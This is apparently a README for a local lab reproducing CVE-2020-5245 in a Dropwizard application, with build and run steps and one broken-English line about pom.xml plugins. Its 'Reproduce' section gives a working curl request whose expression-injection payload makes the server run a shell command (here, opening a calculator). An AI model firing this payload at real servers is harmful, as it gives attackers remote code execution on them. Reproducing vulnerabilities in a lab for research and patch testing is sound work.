CVE-2020-5245
---

1. Run `mvn clean install` to build your application
1. Start application with `java -jar target/dropwizard-1.0-SNAPSHOT.jar server config.yml`
1. To check that your application is running enter url `http://localhost:8080`


some error in `pom.xml` plugins were not affected reproduce


![](start.png)

## Reproduce
`curl http://localhost:8080/bookService/selfValidatingBeanParam?answer=${%27%27.getClass().forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22JavaScript%22).eval(%22java.lang.Runtime.getRuntime().exec(%27/usr/bin/gnome-calculator%27)%22)}`